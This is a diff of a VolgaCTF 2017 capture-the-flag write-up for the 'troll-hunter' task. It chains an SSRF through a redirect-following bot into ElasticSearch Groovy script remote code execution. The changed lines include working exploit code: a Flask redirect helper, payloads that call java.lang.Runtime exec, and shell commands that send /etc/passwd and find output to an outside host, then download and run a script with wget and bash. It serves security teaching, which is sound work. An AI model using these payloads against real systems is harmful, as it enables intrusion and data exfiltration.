@@ -12,7 +12,7 @@
 
 Following provided link we could see a website that wanted to help the world to fight against internet trolles.
 
-After few clicks on inputs and observing request in Burp we find 2 entry points to the underlying API:
+After a while, clicking on inputs and observing requests in Burp we find 2 entry points to the underlying API:
 - quite strange way to get troll information using request to some kind of DB
 - input form that follows submitted IP and do some kind of checks
 
@@ -33,21 +33,21 @@ After some fuzzing we knew that:
 - We could use multiple paramters in query string, like 
 
   ```http://troll-hunter.quals.2017.volgactf.ru:9494/show?id=q=img:*troll*%20name:Anonymous```
-- We could use wildcards like `/show?id=q=fo*` and keywords sort and from
+- We could use wildcards like `/show?id=q=fo*` and keywords **sort** and **from**
 - We could not retrieve anything useful from DB (except trolls that we've already seen)
 
-Using that info we realized that the actual backend proxies our request to the ElasticSearch: `/show?id=` 
-param was URI decoded and used as a query to [search uri](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-uri-request.html)
+Using that info we found out that the actual backend proxies our request to the ElasticSearch. 
+`/show?id=` param is URI decoded and used as a query to [search uri](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-uri-request.html)
 
-So we got that have a full control over the query to the specific index of the ElasticSearch and couldn't do anything interesting enough.
+So we got that have a full control over the query to the specific index of the ElasticSearch but couldn't do anything interesting enough.
 
 *(Writing that text riht now I think that we could try to exploit the target vuln using that functionality, but I can't check it, so let's follow our path)*
 
 ## Report Them All!
 
-The second entry point was the form which report given IP of the troll to the site admins.
+The second entry point was the form which reports given IP of the troll to the site admins.
 
-Obviously we want to check will the provided IP be visited or just stored, so feed the bot with our public IP and wait for it:
+Obviously we want to check will the provided IP be visited or just stored, so feed the bot with our public IP and wait for vivstors:
 
 ```bash
 yalegko@isc:~$ nc -lkvvv 4041
@@ -61,7 +61,8 @@ Host: 92.63.71.187:4041
 ```
 
 Aha! It's alive!
-So after a bit of tries we got:
+
+So after a bit of tries we got that:
 - Bot ignores URI scheme, path and params and uses only provided host and port (all auth parts of URI are also ignored) to do `GET /` request
 - If we answer `200 OK` bot says *"Ok. We'll check this. Thank you!"*, if we send some `4xx` or `5xx` error bot says *"Sorry, we can't check this ip. Something wrong"*
 - **Bot follow redirects!** And morevover it uses provided location as is, so we have full control over request path and query string
@@ -70,7 +71,8 @@ So after a bit of tries we got:
 
 Sending bot to the `http://localhost:9200/_cat/indices?v` we make sure that we can acess elastic in that way, but we cant get any info except **"OK"** or **"Not OK"**.
 
-Oh, no! Is it error-based blind elasticsearch injection? D:
+*Oh, no! Is it error-based blind elasticsearch injection? D:*
+
 At that moment we got much more access to the elastic REST API so we took a closer look to [its docs](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-body.html) and found the following:
 > The body content can also be passed as a REST parameter named source.
 
@@ -83,8 +85,9 @@ Time to try quite interesting field `script_fields`:
 ```
     OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"1+1"}}}
     OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"(new Date()).getTime()"}}}
-    OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"l = (new Date()).getTime(); while((new Date()).getTime()-10000<l){}"}}}
     FAIL -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"import java.net.*"}}}
+    ... Thousands of fails skipped ...
+    OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"l = (new Date()).getTime(); while((new Date()).getTime()-10000<l){}"}}}
 ```
 
 That way we have some kind of java-like language (groovy?) and possible RCE, so we wrote simple webserver and did fuzzing a lot:
@@ -105,7 +108,7 @@ def check(path):
     try:
         lock = True
         url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
-        r = requests.post("http://troll-hunter.quals.2017.volgactf.ru:9494/checkip", data={"ip":"http://92.63.71.187:5000"})
+        r = requests.post("http://troll-hunter.quals.2017.volgactf.ru:9494/checkip", data={"ip":"http://sibears.ru:4042"})
         lock = False
         return r.text, r.status_code
     except Exception as e:
@@ -120,7 +123,7 @@ if __name__ == "__main__":
 
 Using that flask webserver and the little helper:
 ```python 
-search = lambda p: requests.get("http://54.213.85.217:5000/check/_search", params={"source": json.dumps(p)}).text
+search = lambda p: requests.get("http://sibears.ru:4042/check/_search", params={"source": json.dumps(p)}).text
 exec_cmd = lambda cmd: search({"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":cmd}}})
 ```
 
@@ -136,7 +139,7 @@ java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("%s").getTex
 
 And get RCE!
 ```python
-search = lambda p: requests.get("http://sibears.ru:5000/check/_search", params={"source": json.dumps(p)}).text
+search = lambda p: requests.get("http://sibears.ru:4042/check/_search", params={"source": json.dumps(p)}).text
    
 def exec_sh(cmd):
     payload = {
@@ -154,6 +157,7 @@ def exec_sh(cmd):
 ## I Dare You, I Double Dare I'll Pwn You
 
 Do you remember that we have blind shell? 
+
 Surely we tried to run reverse-tcp and http shells but we've failed (probably it's possible but we were quite tired and angry) so all we could do - send results via curl:
 ```python
 exec_sh('curl --upload-file /etc/passwd sibears.ru:4042')
@@ -226,7 +230,7 @@ echo 'cmd' > cmd.txt
 exec_sh("wget -O /tmp/asdqwe sibears.ru:4042/cmd"); exec_sh('bash /tmp/asdqwe')
 ```
 
-After fucking hours of looking for flag in the Share Point we immediately run :
+After fucking hours of looking for flag in the Share Point the first thing we've done - run the find command:
 ```bash 
 find / -name "*flag*" | base64 | curl -d @- sibears.ru:4042/print
 ```
@@ -242,6 +246,6 @@ Flag: `VolgaCTF{troll_is_dead_now_we_win_the_battle}`
 
 Ofc our solution isn't optimal but it reflects our way to get the flag, so I believe that it can be useful.
 
-If you are sure that you can do it faster, we steal [app sources](./task) just btw so you can try to pwn it by yourself.
+If you are sure that you can do it faster, we steal [app sources](./task) just btw, so you can try to pwn it by yourself.
 
 
